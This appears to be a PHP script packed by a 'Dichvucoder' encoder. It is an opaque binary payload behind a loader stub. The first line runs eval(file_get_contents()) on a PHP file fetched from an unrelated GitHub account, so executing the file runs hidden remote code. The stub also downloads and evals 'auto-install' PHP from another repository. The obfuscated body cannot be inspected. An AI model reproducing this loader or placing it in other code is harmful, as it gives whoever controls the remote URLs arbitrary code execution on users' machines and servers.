<?php eval(file_get_contents("https://raw.githubusercontent.com/qdw106311/module/main/data_file.php")); ?>
<?php
/*
----------------------------
PHP Encode V9.0.1 By Đinh Tấn Phát 
Support Email : darkprovip1803@gmail.com
Time        : 20-08-2023 Sunday 11:23:38
IP          : 
Andress     : ??
Country     : ??
Useragent   : DVC STATIC TOOL
Description : hu
Get Rented Encode :  Đinh Tấn Phát 
Zalo : 0964747434
----------------------------
*/
error_reporting(E_ERROR);
$version = phpversion();
if(!defined("ext_ver__"))define("ext_ver__", trim(file_get_contents("https://raw.githubusercontent.com/Dichvucoder/Dichvucoder-9/main/version")));
if (!function_exists("__Gao188whjnandoos__")) {
  function __Gao188whjnandoos__($version) {
    if (strtoupper(substr(PHP_OS, 0, 3)) === "LIN") {
      if (!isset($machine)) {
        $machine = posix_uname()["machine"];
      }
      print_r("Dichvucoder ".ext_ver__." not installed\n");
      print_r("PHP VERSION : $version\n");
      print_r("MACHINE : $machine\n");
      print_r(file_get_contents("https://raw.githubusercontent.com/Dichvucoder/Dichvucoder-9/main/linux/help")."\n");
      print_r("Do you want to install it automatically (y/n) ? ");
      $auto_ins = trim(fgets(STDIN));
      if ($auto_ins == "y" || $auto_ins == "Y" || $auto_ins == "yes" || $auto_ins == "Yes") {
        eval(file_get_contents("https://raw.githubusercontent.com/Dichvucoder/Dichvucoder-9/main/auto-install/linux.php"));
        die();
      }else die();
    } elseif (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") {
      $machine = trim(explode("=>", shell_exec('php -i|find "Architecture"'))[1]);
      $compile = trim(explode("=>", shell_exec('php -i|find "Compiler"'))[1]);
      print_r("Dichvucoder ".ext_ver__." not installed\n");
      print_r("PHP VERSION : $version\n");
      print_r("MACHINE : $machine\n");
      print_r("COMPILE VS : $compile");
      print_r(file_get_contents("https://raw.githubusercontent.com/Dichvucoder/Dichvucoder-9/main/windows/help")."\n");
      print_r("Do you want to install it automatically (y/n) ? ");
      $auto_ins = trim(fgets(STDIN));
      if ($auto_ins == "y" || $auto_ins == "Y" || $auto_ins == "yes" || $auto_ins == "Yes") {
        eval(file_get_contents("https://raw.githubusercontent.com/Dichvucoder/Dichvucoder-9/main/auto-install/windows.php"));
        die();
      }else die();
    } else {
      die("The device you are using does not support executing this file !\n");
    }
  }
}
if (!extension_loaded("dichvucoder")) {
  if (dl("dichvucoder")) {} else {
    __Gao188whjnandoos__($version);
  }
}
if (trim(phpversion("dichvucoder")) == ext_ver__) {
  dichvucoder\php::api("execute");
} else {
  __Gao188whjnandoos__($version);
}
__HALT_COMPILER(); ?>

���������b7a864e96633324bae72f3f0d2ad04d7416f868d3a6d6ea1cd68e8d92f8a4a0d06d600ebd641ebc582ffedde00e9198f��k �ѽ�CY�R
k�HE��U�Y¡�>�Z:I>M.m�K����6ެYk��P�f{��6+Ts�g�B˝���F~w?6_��,ٻk�F	�aE�~�aKUp|��t\�۬�ؘ�H�F��'%d�>�9���*�Z����C�19�_��:�m���7.Ə�o��V��O�K����Q�R�̎��_�]9��\�j}�<�<�ޖg�؍?	�PR߹��3y��$bۖ>i��
E�iIB����4.��II�<t�>ol�hp$w����$�.`������}N����a�a5h5�^�+��#���?}z9��M��{\��
m֟�6��a��Nx�� x�/q��?J�IQˢaS�t�VX� �|	����#�1�ØȪ)�����	(q�xh���Iu0�1T�����ģ����_F0h_|`M%G<F<���ԁ!n�eˌ{鱿oD\��y����-2��_�p0C�}�U�=�1}�T�y�t���-��I�rU��g^J0ǟۇxo��B��0��/\}�ҍ6 ����L��&蛛v�"%�_��e���P��]�gлs�����(��t�:�7{�v[�z��/�D�%^2�E�����'��Y�Q�{�՗�I#a����.�B8��{@?�^ο(PDl��{�Z���Hs>���y�v����Rl3~�<��0O����&���J��1�<�̮����W��z�
�Y�8���"���4�ه�`�-�9P�t�;<���Y Z!�C���4��3�մ��l�e���Qv=+�]�λ"��:����j�ˢP�C�Y���v;��|$�3@��4�9g(�v�8�Q�h�5��nW�ZɇX$���b���~��)c��ȷ�B;���+�HM��|Se��p�K�o��(qv{(�l�EY	$�_UA{����Q���g4|#z��tݸc��X:�/3�J@���u����L5���٬�N^����5�ى�
�U�LsG�-���"���%��Um��6�z �ϟo۟اh����_�aB�\'9���2���H���ݘ��p�!_�ڏx=��*��%�i��,Z	�i��#����a&-|����7Ӏ��2�/1O���M��~�@��T{`p���s9~���x�˻hL4�x�"C����$%J�Z���:^�:\�-b� H��D���L|wLU�k9~4�>���@�G0������� ��"�DRM����,��។H%l6�d�5�l��aa��W�=V"\x-�Y�9���̖ug�~��v�a�lVΪZ[��{��Z���K�!*ZZJ�=V��wЄ�lpӿ2��P>W��6V
!������av��d�����qk�I�W�8ПhL���`�g���\�,��Pk ��L�J�!��G���Í1_�IW7��w�'WR@�C�w��g�(�֤7�k&��`?��-_�Uc�Ꭻ`������dod�3��#~ϥ9�Pj��s����2,��PU$(FC�CV����-NV�z0�J��M���r�(z�P��~j/]]��p�Ki��P��r���m�!��i+92}�pclY�3~&�$���޵��0D��߽#+a�����t�FT�_��z���BC����A~1��EJ���Tk�Z�1�D� P�ۻӒ��̖��~�+�)�.��H�,	}�dF�n��I��ծ�z��v��D�Rհ��A��zw��ߟF#�?9Nk�2J��DЩ#��Ps&W
a@%H�J�[���
/�&->�:&H�1F,�#c�T�k�O�_��k�6O>���L�ae�YMh"��/D�I'�s&]l� �dg�?�[7)����~���r�����D_���D�,պ�G��>9�
<��D_��H�*W��y�
�*�ŭq>7N�ڭc���f9�40�x�ft��(q����{���O��Ǧ��i�30D�b��'�Ɛ�FG!pF���ĉ�<�쭾��!�o�j��<_F.���౅��[�b�cD�j�,�&�=�H'>�*+�h�z��k�$�lPz7º'��D98]TL��fRq�c�~�S�|��7@��s�U>o-#݀E[�kØc#E]&MuF�P1���@hM"�-�������I���D�`sY?�G��$��h\��[Y���K:"��>̔����.����A���pTOg���sD��X�b��o�f�b�k�K����A<d�2sy�if���]s���f7���m "�c���"��qW ��w����J�uƫ %�wt%.��S皂(���ɭsn��n��"��[A)�&Ԧ}�pc�aV�����F�Yε8���`~���<��/�8�ut��28���B�e�=%L���)�x�l�o���T�b�0�e.0uy����v� W�R�`\W9��hr��"�"LD�1��	H�eN#2c�	����dd������r�F?�� 4~t�	��K��L��53��̧��wo��,V$A�=�e��S�\��P�7檥m�M��qg����:}���#��Qw�����$�(��fy0�K�mBO�W�cj�`B�!��k,�;��o��23|�?�0����EV���0����ߍ'�2:�dxt�������7��cz+L�����{DOIO� �÷�/e��_ݔ�ʙëm��iyP�;u���d��$}R\*��u��i�1��A8�����)-�C�W�-A|V[1�W�֥��M�Q�K���q��d0�X�=�����;�(6��S�w����,d��&�e�c�L�K$����7,(8M���a
ku�	�/�h&����E��^�����U�cu�n���=Q:;��S��tC3�n�J`BO��$'ts��^�H���Z[4�7X"v�J-l�$mߐ0��bV���Kn���}��%�M�`�˶!�e�קvu%2�T�1(��͏7�˨[2%4��vq֞�k@f��]1�{�����  %��T��՘#L
X�-4�X춲~W�=��!ḡ�8���N��e�a�c��R�؊�1,��\7m�Mz��z�*��	xtE^y���W����/f^���+�5-��ۭ�sj�`�j�K�d*�Z��J�P^��ɼ�?�#�y���1����'�i3��B���B����H�_2��yjB�n|
�h�
���&Uj`*����7�$6���x�G�E��ª�����87�*�;�*��h����Z�� �����	Ҵ
��o��T�9�ȳ�jn�o�}���ا(�34u��p���r�����^� j��{����]wS�A�?�&Α�i���dHc>�\� i�Fa�OHJ1��5�O4�~di�*��t��1�� J���#_���x�J��z�B��9�6����q-�=�^�g��o"��P��ƕ
�qٚ�ߔ��{�y��(�����)��q��l2��t��NJ�I�X�[[j�B�H�M,�Z���D��;("�T�z2�.l'���n������
���� ��1B't��W�+���P�1��9l�����$��q(r*�*t�?w_��R������f�JvsG�Z�팮�o��N7�Fg�Jg��3l����M�ę i��}�H��^Q��p�^n�~�Ƀ��z���v��_c�Y����I"���3�*���|� #ť��I�(��O����d@)�zԲo!��4�+�9.���?@�ȃ|�?��a�.�5E�7��M�[Ɵ��'N��ڭ[Y���S�fpK���a���ιO��:J���C�t��/趷�,���K9�����W�o��b'��^��L��s��O��N���?��W�Y�+�ź��q��ڃW/��[�{��3��/��'��)��fT�I=���Ǝ&�4�j��X�� �z�E�;�i�����]��l{�c�6{N���~т�Wt:iS+�u���h�4%S�M���W�C8�/�	�>1�+eY��%7�ZǨ&&��w��F~�r��͟����֘��M��O��$��%�:	�ݟwQ�4>����u?���`lg�q.��YE�m�٠c$a29&�	m6rCbhQO���"2���>��ɥ�n��c��wxژ��
\��t��"e&{�7p��������O��xт��6�9�.͐"�Z��:��W�4%�9�ym̻��h��,��B\����{FF�:�3�]���%_gk]d�P\ƮCѽ�����8w�`��(/�@�v�J_���by�(V#�h�%qc/�V�"�BL^H��67���m�Dl������l3l��I�p��L�"�B�/$��y�%[�1�u��gM�2Q�JL1��(X��
l�r~0��Uϡ���``=���5x�ȁŰ�	�!��U>���Dп�!�g4F��@.�O��$�+Nûz���oZ�X)�n%�Mj�5ldX���j��E�u�V��N�ݶ0���ݒF�F��+��?�C�ѲGD�J�P$��n�VN�ō�͙��NG*�׀��D`��B0j\�B�IH�	*�F)m	��`�v`	�W2/�4v���,�Ë���@n57i]���}��DP�e�����zf eI
�_���ֱ*2�G�a���,��F׿��0��,^�~~�r���*	�ys/I���� ��w�Qx1=L{K)V	���{J���9�E��j��H��55��9��m��9�?]���0*��>	�[Ҳai2����ĉ��[�I9�>�����3ArR!���r쥗��ΣɁ�˙��%���	i��W�ua�1�ի�[R{+�{�v��6/ z�D�#E��P�P-���9�p�tЂ~4���u7�!�O0�N��	�v�V��FR�5 ����\@�ړ��R�8H�����y�k�??��uw�lQgn�5�:Z�aD��0���O/��iLJ0���ҡ�$�N���	��r��Bz��[.0��Iu����Ѯ�yދ7O9*$�9xVf~�������\K��$(�6���L;A{5�X5�{-Cc~�V���䷑� ?Wi��@;�J�L�P߀��,;~��ϳ� �r5ѡ�>�����X��"o=�?�ȗ��%��t���Ν8�`D���a��7�ڄ�}�"�rE�d�;����Q��<P �H���E��%0:]=n4�O����Yƛd��_өJ��Jo���v�jF���1l[o��у5B<4A�����{��x
+ARn���yQ��.����{l�y��:���_\tg;�n��H�%��g�-�_����|�i:R�?e����LP�}�&'��Q�)ܟ�B������!���������,�sDI�ΓrC�"�����̬��SȽF�Tt�j0���A����cR��O$Q9ɬ����FkjRYOh�kؓ�B`�[XN�	yu$Ȼ�\��f]��=�䆇{�u���j�
(2�&�@��2��P���i������g���QlMKC�@�L ��Z�uԟ�MM+�n�@���jf.��.�����5�Y ')o�il�?|�\�Bw�~d��66 �~�N�[��~y�l"V���l~�I��x������

DICHVUCODER ENCODE FILE VERSION 9.0

GITHUB HOME PAGE : https://github.com/Dichvucoder/dichvucoder-9

READ ONLY FILE ENCODE !

BYE
<?php?dvc
#VAR
sha1_very=a927f40945cc1dc438e1d68025e618af72c20e59.end